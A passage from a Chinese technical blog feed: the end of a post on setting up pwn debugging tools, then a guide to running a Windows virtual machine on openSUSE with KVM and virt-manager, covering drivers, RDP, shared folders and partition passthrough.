NixOS），你可以通过如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nix shell github:pwndbg/pwndbg<br>pwndbg ./your-binary<br></code></pre></td></tr></table></figure><h2 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h2><blockquote><p>注：peda 和 pwndbg 你只需要安装其中之一，由于功能重复，且为了避免插件冲突，我们并不推荐你同时安装这两个插件。</p></blockquote><p><a href="https://github.com/longld/peda">peda</a> 是一个强大的 GDB 插件，通过该插件我们可以在调试时很方便地查看运行环境以及获取堆内存布局等信息。</p><p>peda 插件无需过多配置，我们只需要将源码下载到本地后更新 gdb 配置即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/longld/peda.git ~/peda<br>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit<br>echo &quot;DONE! debug your program with gdb and enjoy&quot;<br></code></pre></td></tr></table></figure><h1 id="0x03-杂项配置"><a href="#0x03-杂项配置" class="headerlink" title="0x03. 杂项配置"></a>0x03. 杂项配置</h1><h2 id="为-Linux-下运行-IDA-配置-desktop-shortcut"><a href="#为-Linux-下运行-IDA-配置-desktop-shortcut" class="headerlink" title="为 Linux 下运行 IDA 配置 desktop shortcut"></a>为 Linux 下运行 IDA 配置 desktop shortcut</h2><p>wine 对于 Windows 各种 API 的重写已经非常成熟了，这使得 IDA Pro 的 Windows 版本（或许也是绝大多数人会使用的版本）能够比较轻松地在 Linux 下运行，对于完全工作在 Linux 下的同学这是一件好事，因为这意味着不需要使用虚拟机来单独运行 IDA Pro</p><p>对于想要为 IDA 创建快捷方式的 Linux Desktop 用户，你可以参考如下模板编写 <code>.desktop</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/env xdg-open</span><br>[Desktop Entry]<br>Name=IDA Pro 7.5<br>Comment=A powerful disassembler and a versatile debugger<br>GenericName=Disassembler<br>Exec=wine /home/arttnba3/Applications/IDA7.5/ida64.exe<br>Icon=/home/arttnba3/Applications/pic/ida64.png<br>Type=Application<br>Categories=Development;<br>Keywords=IDA;<br></code></pre></td></tr></table></figure><p>完成编写后将该文件放到 <code>~/.local/share/applications/</code> 目录下即可：</p><p><img src="https://s2.loli.net/2024/05/15/7UVMnDA6q1eJblK.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;信 Docker ，得永生&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="https://arttnba3.github.io/categories/PWN/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x03】在 Linux 上食用 Win VM</title>
    <link href="https://arttnba3.github.io/2024/02/27/VIRTUALIZATION-0X03_WIN_VM_SETUP_GUIDE/"/>
    <id>https://arttnba3.github.io/2024/02/27/VIRTUALIZATION-0X03_WIN_VM_SETUP_GUIDE/</id>
    <published>2024-02-27T03:22:58.000Z</published>
    <updated>2025-03-14T19:25:26.073Z</updated>
    
    <content type="html"><![CDATA[<p>4202 年了，Linux Desktop 还会好吗？</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者自从 <code>Win 物理机 + Linux VM</code> 转到 <code>Almost all in Linux</code> 的生活已经过了大半年了，用 openSUSE 也已经小半年了，除了 Nvidia on Wayland 日常撕裂以及盒盖行为设定为 <code>Lock Screen</code> 会醒不来以外似乎还没有太多问题，但除了代码以外的日常生活总感觉不是特别彳亍：</p><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p>笔者比较喜欢使用酷狗音乐进行听歌（ <del>👴一直都是高贵的酷狗年费会员啊</del> ），但是酷狗是没有官方的 Linux 安装包的，使用 wine 兼任层可以跑起来但是笔者捣鼓了大半天都没有声音：(</p><blockquote><p>Arch 社区打的酷狗 AUR 包似乎可以正常播放，但是笔者也没有时间重新弄回 Arch 了，更没有那个闲时间去研究怎么在 SUSE 上弄了</p></blockquote><p>网易云音乐 <em>曾经有 Linux 版，但是用的 deb 打包，而且也非常久没有更新了，现在官网上也下架 Linux 版了</em> 因为笔者不常用网易云所以也没有尝试用 wine 跑过，但以 wine 现在的水平估计也不会好到哪去（</p><blockquote><p>腾讯音乐之类的就没有用过也不太打算尝试了：）</p></blockquote><p>海外的大部分听歌软件像 <a href="https://www.spotify.com/">Spotify</a> 都是有 <a href="https://www.spotify.com/au/download/linux/">Linux 版</a> 的，但是笔者也会听一些非常小众的歌，这些在 Spotify 上都是没有的，上边只有那些国际化大歌曲（ <del>这就不得不提国内很多小众音乐人的含金量了，什么叫世界第一强国啊</del> ）</p><p>但这还不算最要命的，Sportify 有个非常致命且非常 sb 的设计——<strong>电脑端的 Spotify 每听个一两首歌就会插入一段广告来逼你开会员</strong>，这样的产品策略让笔者很难去使用一些比较正面的词汇去进行评价</p><p><img src="https://s2.loli.net/2024/02/21/MRftUv7gSXDbn8I.png" alt="try not to c*m in 30 seconds"></p><h3 id="Office-套件"><a href="#Office-套件" class="headerlink" title="Office 套件"></a>Office 套件</h3><p><a href="https://www.libreoffice.org/discover/libreoffice/">LibreOffice</a> 作为大部分 Linux 发行版都会默认带着的开源 Office 套件，用着感觉虽然还行但是和 Microsoft Office 相比总感觉有哪里差点意思（<del>就是用着总感觉有哪里不得劲</del>），当然临时顶用其实还好但是 <em>直接重启切回 Windows 写文档不好么</em></p><p>——Microsoft Office 虽然没有 Linux 版但是有个网页版，支持在网页进行编辑甚至在网页上完成 PPT 演示的功能，但是网页版的用着总感觉 <em>也还是差点意思</em> ，而且和 native app 相比总感觉有些卡卡的，唯一的优点大概就是 all on cloud 不用担心数据丢失了：</p><p><img src="https://s2.loli.net/2024/02/21/K4tE6BdfTzigPDL.png" alt="临时做个 PPT 演示还行，但是这样为什么不直接用 Windows 呢"></p><blockquote><p>至于国产 Office 套件 <a href="https://www.wps.com/">WPS</a>，技术水平暂且不谈,当笔者在自家老母亲的旧电脑上打开这软件后跳出一堆各种花花绿绿的广告铺满屏幕然后让电脑变得特别特别卡的时候笔者就决定<strong>哪怕再多花点钱多买几套正版的 Office 也不会再考虑这一款国产软件</strong></p><blockquote><p>当然，除了这个问题以外，WPS 还存在<a href="https://www.zhihu.com/question/542676012">数据安全问题</a>，那这是否就有点…</p></blockquote></blockquote><h3 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h3><p>在这个 QQ 都转向 NTQQ 的 4202 年微信还是迟迟不出 Linux 版就令人很难评了<del>这就不得不提某人的含马量了（）</del>，使用 wine 来运行 WeChat 勉强算是一个可行的策略，但是强行用 wine 跑起来的微信只能说是勉强能用，各种功能缺失以及不完整再加上 wine 的功能不完善带来的令人难以直视的各种边框更是让人想要毁灭世界，而功能本就缺失的网页版微信也慢慢变得不再可用，想要在 openSUSE 上完美使用微信似乎已经变成了一种奢求</p><p><img src="https://s2.loli.net/2024/02/23/FoyxtmMUnrJzel9.png" alt="有没有深圳上单能去猎一下某人的🐎.jpg"></p><p>海外的办公软件如 Slack 和 Discord （这个大概勉强也能算办公软件）倒是有原生 Linux 版，What’s App 有网页版但是笔者倒是没有用过，Teams 则只有网页版可用</p><blockquote><p>飞书以及其海外版 Lark 却是都有非常好用的原生 Linux 版， <del>那这里👴就不得不夸一夸👴的前东家国际化大企业字节跳动的含金量了</del> </p><p>至于像钉钉这样的软件似乎也是有 Linux 版，不过笔者基本用不到这个软件所以暂且就不进行深入了解了</p></blockquote><h3 id="游戏及各类其它问题"><a href="#游戏及各类其它问题" class="headerlink" title="游戏及各类其它问题"></a>游戏及各类其它问题</h3><p>这里就不展开说了，因为前面已经讲了这么多废话了，同时笔者也懒得再打字了，总而言之 Linux 除了与计算机专业直接强相关的东西以外似乎都没有比较完美的原生解决方案，这令笔者十分苦恼 ：(</p><h2 id="How-to-解决？"><a href="#How-to-解决？" class="headerlink" title="How to 解决？"></a>How to 解决？</h2><p>让我们重新回顾《虚拟化导论》中的一个基本概念：<code>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化</code> ；因此对于 <code>想要在 Linux 下运行 Windows 独占的软件</code> 这个需求而言，我们只需要提供一个相应的兼容层便能运行——<a href="https://www.winehq.org/">wine</a> 便是这样一个软件，其通过提供相应的 Windows 执行环境（如重新实现各种 DLL）来实现，虽然说目前已经能够流畅地运行很多原生 Windows 软件，但是要把整个 Windows 都给重新实现一遍的工作量相当巨大，至少就目前而言还是缺少相当多的各种不同的运行库，难以真正地在 *NIX 系统上完美无缝运行 Windows 下的二进制程序</p><p><img src="https://s2.loli.net/2024/02/23/6asVIrGX1WygDmq.png" alt="网易云其实原本是有 Linux 原生的，可惜前几年终止开发了"></p><p>重新再看虚拟化层次的划分，Wine 是通过实现了 API 抽象层来完成 Windows 各种运行库的虚拟化，那么再往下一层呢——若是我们能够实现硬件抽象层，我们便能完成操作系统级的虚拟化，这样我们自然便有了一个对应操作系统的完整运行环境——即通过<strong>虚拟机</strong>（Virtual Machine）来运行一个完整的 Windows 系统，这样<strong>我们便能完美运行原生的 Windows 程序</strong> ，若是之后我们再将一些必要的设备给 passthrough 进 Windows 中（或是纯模拟也行）、建立好完善的共享文件夹等机制，我们便能舒适地将 Windows 虚拟机融入到我们的 Linux 物理机当中：）</p><blockquote><p>当然，虚拟机的性能损耗肯定是有的，但很多情况下这些性能损耗其实无所谓 ：）</p></blockquote><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png"></p><p>因此本篇文章将教大家如何在 Linux 上优雅地食用 Windows 虚拟机</p><blockquote><p>——好吧， <em>运行一个 Windows 虚拟机来跑 Windows 程序这件事似乎是没有任何的新意</em> ，<strong>但若是我们能够通过 RDP 连接直接映射不同的程序窗口而非整个桌面呢？</strong> ——<code>远程桌面协议</code>（Remote Desktop Protocol）让通过网络的远程计算机桌面图像传输与鼠标键盘事件传输成为了可能，同时 xfreerdp 支持仅传输单个应用窗口，由此<strong>我们就能达成在 Linux 桌面中近乎完美地原生运行 Windows 程序的效果</strong></p><p><img src="https://s2.loli.net/2024/02/21/uqlDdERXCQpo3Z7.png" alt="image.png"></p><p>不过由于各种问题，<strong>目前这种办法依然存在较大的 bug，没办法足够舒适地运行</strong>，目前而言只能继续期待后人的努力：）</p></blockquote><h1 id="0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机"><a href="#0x01-通过-Virt-Manager-KVM-运行一个-Windows-虚拟机" class="headerlink" title="0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机"></a>0x01. 通过 Virt-Manager + KVM 运行一个 Windows 虚拟机</h1><h2 id="安装虚拟化相关组件"><a href="#安装虚拟化相关组件" class="headerlink" title="安装虚拟化相关组件"></a>安装虚拟化相关组件</h2><blockquote><p>参考 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/index.html">openSUSE - Virtualization Guide</a> 和 <a href="https://zh.opensuse.org/KVM">openSUSE wiki - KVM</a> 以及 <a href="https://documentation.suse.com/zh-cn/sles/15-SP4/html/SLES-all/cha-kvm-intro.html"> SUSE Linux Enterprise Server 文档 - 虚拟化指南</a></p></blockquote><p>首先检查自己的 CPU 是否支持硬件虚拟化（<del>不过这个年代应该没有不支持硬件虚拟化的 CPU 了吧</del>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo LC_ALL=C lscpu | grep Virtualization</span><br></code></pre></td></tr></table></figure><blockquote><p>如果没有结果的话重启进 BIOS&#x2F;UEFI 里开一下，有些机型默认不会开启 CPU 虚拟化，<del>若是真的不支持硬件虚拟化那笔者还是建议你赶紧换一台电脑，或者至少换个 U 吧，都什么年代还在用传统电脑</del></p></blockquote><p>然后安装 libvirt,一个非常舒适的虚拟机管理库，这里直接用 YaST 来安会非常方便：</p><p><img src="https://s2.loli.net/2024/02/21/MeTP9qdfWFSRG6g.png" alt="这就是我们 SUSE 的 YaST 啊，你们有没有这样的 YaST 啊，真是 YY 又 aa、SS 又 TT 啊.jpg"></p><blockquote><p>这里笔者安完才发现忘了勾上 <code>KVM server</code> 了，但是再打开发现按钮灰了没办法补勾上…..不过也无所谓了反正看这篇文章的小伙伴记得勾上就好 ：）</p></blockquote><p>然后安装 virt-manager 和 libvirt-daemon：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> virt-manager libvirt-daemon</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> libvirtd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl start libvirtd</span><br></code></pre></td></tr></table></figure><blockquote><p>QEMU 的话因为要做 kernel pwn 的缘故笔者很早就安装上了所以安装步骤这里就略过了，这里大家就自己想办法安吧（笑</p></blockquote><p>在 <code>.bash_profile</code> 里导入这个变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LIBVIRT_DEFAULT_URI=qemu:///system<br></code></pre></td></tr></table></figure><p>把自己加相应的组里再重启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G libvirt $(<span class="hljs-built_in">whoami</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -a -G kvm $(<span class="hljs-built_in">whoami</span>)</span><br></code></pre></td></tr></table></figure><p>配置 default 网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-define /usr/share/libvirt/networks/default.xml</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-autostart default</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo virsh net-start default</span><br></code></pre></td></tr></table></figure><blockquote><p>注：libvirt 默认的 NAT 网络<strong>似乎有些小问题</strong> （参见 <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book-virtualization/cha-libvirt-host.html">openSUSE doc</a>），如果你没法联网那笔者还是建议使用桥接模式</p></blockquote><h2 id="安装-Windows-虚拟机"><a href="#安装-Windows-虚拟机" class="headerlink" title="安装 Windows 虚拟机"></a>安装 Windows 虚拟机</h2><p>首先在 virt-manager 里 enable 上 xml 编辑：</p><p><img src="https://s2.loli.net/2024/02/22/ZgwYWakbBunNDTR.png" alt="image.png"></p><p>然后下载 <a href="https://www.microsoft.com/software-download/windows11">Windows ISO</a> 和 <a href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso">KVM virtio Drivers</a></p><p>之后在 virt-manager 里创建一个虚拟机，创建过程中别忘了勾上 <code>Customize configuration before install</code> ，完成基本配置后挂上第二个 ISO：</p><p><img src="https://s2.loli.net/2024/02/22/BrWcYaihNm83lu9.png" alt="image.png"></p><p>然后在 CPU 的 XML 里编辑 <code>clock</code> ，<strong>修改为如下配置</strong> ,这样可以减少待机开销：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">clock</span> <span class="hljs-attr">offset</span>=<span class="hljs-string">&#x27;localtime&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hpet&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">timer</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hypervclock&#x27;</span> <span class="hljs-attr">present</span>=<span class="hljs-string">&#x27;yes&#x27;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">clock</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启用 <code>shared memory</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/lgUtwfdYejPDprI.png"></p><p>其他的比如说：</p><ul><li>virt-manager 里该 VM 名字改为 <code>RDPWindows</code></li><li>配置自启动</li><li>硬盘类型改为 virtio</li><li>网卡模型改为 virtio（可选）</li></ul><p>之类的过程笔者这里就略过了，网上资料一大把：）</p><p>接下来 <code>Begin Installation</code> 然后就是：Windows，启动————</p><blockquote><p>忘了截开始界面了，无所谓了</p></blockquote><p>我们的硬盘是 virtio 的，所以首先是 <code>加载驱动程序</code>：</p><p><img src="https://s2.loli.net/2024/02/22/iKncHYCWN3XwAkU.png"></p><p>Windows 安装程序会自动扫到我们的 virtio 驱动的 CD，直接选对应版本：</p><p><img src="https://s2.loli.net/2024/02/22/7JUZdRSg68VINnk.png"></p><p>Windows 11 默认没有网不给安装非常 sb，不过 <code>shift + F10</code> 唤出 cmd 输入 <code>OOBE\BYPASSNRO</code> 重新开始就能绕过了：</p><p><img src="https://s2.loli.net/2024/02/22/pOfl2IcSr9YbxtC.png"></p><p>进系统以后找到我们的 virtio 驱动光碟，运行 <code>virtio-win-gt-x64.msi</code> 和 <code>virtio-win-guest-tools.exe</code> 安驱动（全选就行），然后就有网了：</p><p><img src="https://s2.loli.net/2024/02/22/AIfG5mivr6zN9yu.png"></p><p>然后开浏览器把 <a href="https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg">https://github.com/Fmstrat/winapps/blob/main/install/RDPApps.reg</a> 下载到本地并右键 <code>合并</code> ：</p><p><img src="https://s2.loli.net/2024/02/22/Ilq7dp9ocfCzFTm.png"></p><p>然后进设置里开远程桌面就行：</p><p><img src="https://s2.loli.net/2024/02/22/yWUONuJ5z9CX2hg.png"></p><h2 id="配置-Guest-与-Host-间的数据共享"><a href="#配置-Guest-与-Host-间的数据共享" class="headerlink" title="配置 Guest 与 Host 间的数据共享"></a>配置 Guest 与 Host 间的数据共享</h2><p>为了方便直接通过 virt-manager 使用 VM，还可以进 VM 里安装 <a href="https://www.spice-space.org/download/windows/spice-guest-tools/spice-guest-tools-latest.exe">spice-guest-tools</a>，这样便能支持 Host 与 Guest 之间各种不管是文本还是图片的各种互相复制粘贴了</p><blockquote><p>如果剪贴板共享坏了，在 <code>服务</code> 里检查一下 <code>SPICE</code> 相关服务是不是挂了，如果经常挂的话建议配置为 <code>自动（延迟启动）</code></p></blockquote><p>对于 Host 与 Guest 之间的文件传输，使用 <code>共享文件夹</code> 似乎是一个不错的方法，将 VM 关机后进入设置中添加一个新的 <code>Filesystem</code> virtio 设备即可：</p><p><img src="https://s2.loli.net/2024/02/22/l9ASvEDfMkzyBUt.png"></p><p>接下来在 Guest VM 中安装 <a href="https://winfsp.dev/">WinFSP</a>（Windows File System Proxy），aka FUSE for Windows，用以挂载我们的共享文件夹</p><p><img src="https://s2.loli.net/2024/02/22/O8BhKgX5WY47tuR.png" alt="只安装 Core 其实也行"></p><p>前面我们已经安装过 virtio 驱动了，所以这里直接重启就行，打开设备管理器后我们便能看到一个 VirtIO FS 设备：</p><p><img src="https://s2.loli.net/2024/02/22/ksPrQjNEvtylWwA.png"></p><p>在 <code>服务</code> 中找到 <code>VirtIO-FS Service</code> 将其设为 <code>自动</code> ，<code>应用</code> 后点击 <code>启动</code>：</p><p><img src="https://s2.loli.net/2024/02/22/Pabrv2cozpUhKYu.png"></p><p>然后就 ok 了：</p><p><img src="https://s2.loli.net/2024/02/22/atYk9XEob2nf6h4.png"></p><blockquote><p>如果你在配置了共享文件夹后 VM 无法启动，且提示 <code>virtiofsd died unexpectedly</code> ，首先检查 <code>/var/log/libvirt/qemu/</code> 下的相关日志文件，若有类似 <code>libvirt:  error : cannot execute binary /usr/libexec/virtiofsd/virtiofsd: Permission denied</code> 这样的提示，则有可能是 <code>AppArmor</code> 的原因</p><p>解决方案是在 <code>/etc/apparmor.d/usr.sbin.libvirtd</code> 中适当的位置添加一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/&#123;lib,lib64,lib/qemu,libexec&#125;/virtiofsd/* PUx,<br></code></pre></td></tr></table></figure><p>之后 <code>sudo service apparmor restart</code> 重启 AppArmor，理论上此时便能正常启动了</p><p>若还是不行，则检查 <strong>libvirtd 服务是否存活</strong>，并进行重启</p></blockquote><blockquote><p>如果重启后你的 VM 无法连上网，可能是防火墙禁止了转发（通过 <code>iptables -A FORWARD -j ACCEPT</code> 命令启用转发），也可能是 libvirtd 莫名其妙挂了，<del>也可能是玄学问题多重启几遍就莫名其妙好了</del></p></blockquote><h2 id="Extra-同一物理磁盘分区直通-（not-so-recommend）"><a href="#Extra-同一物理磁盘分区直通-（not-so-recommend）" class="headerlink" title="_Extra. 同一物理磁盘分区直通_（not so recommend）"></a>_Extra. 同一物理磁盘分区直通_（not so recommend）</h2><blockquote><p>参考<a href="https://jianmin.dev/2020/jul/19/boot-your-windows-partition-from-linux-using-kvm/">这篇文章</a></p></blockquote><blockquote><p>注：如果你是在已有数据的分区上进行操作，<strong>请首先确保已经完成了数据备份</strong>！！！</p><p>注2：仅分区直通很容易把 Windows 干碎，然后出现各种问题，<strong>推荐大家还是买个双盘位电脑然后单独通一个盘给 Windows</strong></p></blockquote><p>虚拟机硬盘直通放在 4202 年自然已经不是一件稀奇的事情，但是通常的硬盘直通架构都是要将一整块物理硬盘通给单个虚拟机，若是你和笔者一样买了一部只有单盘位的笔记本（但是笔者的上一部笔记本有三盘位， <del>这次属于是经典考虑不周了</del> ），<strong>同时希望保留原有物理硬盘的 Windows 直接启动的能力</strong>，那么我们只能先预先分好区，之后再<strong>通过将分区建立为新的虚拟磁盘设备的方式</strong>将这部分分区作为一块新磁盘通给虚拟机</p><h3 id="创建-virtual-RAID-disk"><a href="#创建-virtual-RAID-disk" class="headerlink" title="创建 virtual RAID disk"></a>创建 virtual RAID disk</h3><p>首先载入点必要的驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe loop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe linear</span><br></code></pre></td></tr></table></figure><p>接下来创建三个文件作为 GPT 表、 EFI 分区、 GPT 元数据，并挂载为 loopback 设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=gpt bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi1 bs=1M count=100</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=efi2 bs=1M count=1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f gpt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi1</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo losetup -f efi2</span><br></code></pre></td></tr></table></figure><p>此时用 <code>losetup -a</code> 应当能看到三个 loopback 设备：</p><p><img src="https://s2.loli.net/2024/02/26/yTtnwX52JzfZYFc.png"></p><p>打开 YaST2 Partitioner （或是其他你所熟悉的能够查看分区信息的工具比如说 <code>fdisk -l</code>），找到原本属于 Windows 的那几个分区<strong>当中的数据分区</strong>：</p><blockquote><p>注：如果你原本就没有已经装好了的 Windows 分区，直接在待用分区上创建一个新的逻辑卷给 Windows 用就行</p></blockquote><p><img src="https://s2.loli.net/2024/02/24/VWeF4iTcSs3qL9n.png" alt="需要注意的是，笔者在安装 Linux 时使用了新的 EFI 分区，而并非和 Windows 共用一个"></p><p>然后使用 madam （Multiple Disk and Device Administration）创建 RAID，以及注意不要把物理盘的 EFI 分区选进来了）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mdadm --build --verbose /dev/md0 --chunk=512 --level=linear --raid-devices=6 /dev/loop0 /dev/loop1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/nvme0n1p4 /dev/loop2</span><br></code></pre></td></tr></table></figure><p>然后进入 parted 进行分区，<strong>注意分区大小</strong>，注意 <code>mkpart</code>  子命令的格式为 <code>mkpart [part‐type name fs‐type] start end</code> ，<strong>注意自行计算分区起始位置</strong>：</p><blockquote><p>数据无价，谨慎操作！</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo parted /dev/md0</span><br>GNU Parted 3.6<br>Using /dev/md0<br>Welcome to GNU Parted! Type &#x27;help&#x27; to view a list of commands.<br>(parted) unit s                                                           <br>(parted) mktable gpt<br>(parted) mkpart primary fat32 2048 206847                                 <br>(parted) mkpart msr 206848 239615                                         <br>(parted) mkpart primary ntfs 239616 1677961215                            <br>(parted) mkpart primary ntfs 1677961216 -2049                             <br>(parted) set 1 boot on                                                    <br>(parted) set 1 esp on                                                <br>(parted) set 2 msftres on                                                 <br>(parted) set 3 msftdata on                                                <br>(parted) set 4 hidden on                                                  <br>(parted) set 4 diag on                                                    <br>(parted) name 1 EFI                                                       <br>(parted) name 3 Windows                                                   <br>(parted) quit                                                             <br>Information: You may need to update /etc/fstab.<br></code></pre></td></tr></table></figure><p>然后用 <code>mkfs.msdos</code> 格式化 EFI 分区：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.msdos -F 32 -n EFI /dev/md0p1</span><br></code></pre></td></tr></table></figure><p>接下来编辑虚拟机磁盘：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">disk</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;block&quot;</span> <span class="hljs-attr">device</span>=<span class="hljs-string">&quot;disk&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">driver</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;qemu&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;raw&quot;</span> <span class="hljs-attr">cache</span>=<span class="hljs-string">&quot;none&quot;</span> <span class="hljs-attr">io</span>=<span class="hljs-string">&quot;native&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;/dev/md0&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">dev</span>=<span class="hljs-string">&quot;vda&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;virtio&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">boot</span> <span class="hljs-attr">order</span>=<span class="hljs-string">&quot;1&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">address</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;pci&quot;</span> <span class="hljs-attr">domain</span>=<span class="hljs-string">&quot;0x0000&quot;</span> <span class="hljs-attr">bus</span>=<span class="hljs-string">&quot;0x04&quot;</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;0x00&quot;</span> <span class="hljs-attr">function</span>=<span 